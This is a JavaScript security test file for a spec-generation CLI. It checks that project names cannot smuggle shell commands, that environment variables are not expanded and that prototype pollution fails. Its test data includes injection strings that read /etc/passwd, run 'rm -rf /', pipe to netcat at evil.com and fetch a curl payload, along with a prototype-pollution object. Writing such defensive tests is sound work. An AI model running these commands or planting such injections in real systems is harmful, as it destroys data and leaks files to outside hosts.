
// RED TEAM EXPLOIT TESTS
import { test } from 'node:test';
import assert from 'node:assert';
import { spawn } from 'child_process';

test('Command execution prevention', async () => {
  // Test if malicious commands can be executed through project names
  const maliciousCommands = [
    'test; cat /etc/passwd',
    'test && rm -rf /',
    'test | nc evil.com 1337',
    'test $(curl evil.com/payload)'
  ];

  for (const cmd of maliciousCommands) {
    const child = spawn('node', ['~/specify', 'init', cmd], {
      stdio: 'pipe',
      timeout: 5000
    });

    let stdout = '';
    let stderr = '';

    child.stdout.on('data', (data) => stdout += data.toString());
    child.stderr.on('data', (data) => stderr += data.toString());

    await new Promise((resolve) => {
      child.on('close', resolve);
      child.on('error', resolve);
    });

    // Should not execute malicious commands
    assert(!stdout.includes('root:'), 'No system file access');
    assert(!stdout.includes('connection'), 'No network connections');
    assert(!stderr.includes('command not found'), 'No command execution');
  }
});

test('Environment variable exposure', async () => {
  const { GitHubSpecKit } = await import('../src/spec-kit/github-integration.js');
  const specKit = new GitHubSpecKit();

  // Test if environment variables can be exposed
  const spec = await specKit.initializeSpec('$' + '{process.env.HOME}', 'web-app');
  const content = specKit.generateSpecNewFormat(spec);

  // Should not expose actual environment variables
  assert(!content.includes(process.env.HOME), 'Environment variables should not be expanded');
  assert(!content.includes(process.env.USER), 'User info should not be exposed');
});

test('Prototype pollution protection', async () => {
  const { GitHubSpecKit } = await import('../src/spec-kit/github-integration.js');
  const specKit = new GitHubSpecKit();

  // Attempt prototype pollution
  const maliciousSpec = {
    '__proto__': { polluted: true },
    'constructor': { prototype: { polluted: true } },
    name: 'test',
    description: 'test'
  };

  await specKit.initializeSpec('test', 'web-app');

  // Check if pollution occurred
  assert(typeof Object.prototype.polluted === 'undefined', 'Prototype should not be polluted');
  assert(typeof {}.__proto__.polluted === 'undefined', 'Proto should not be polluted');
});
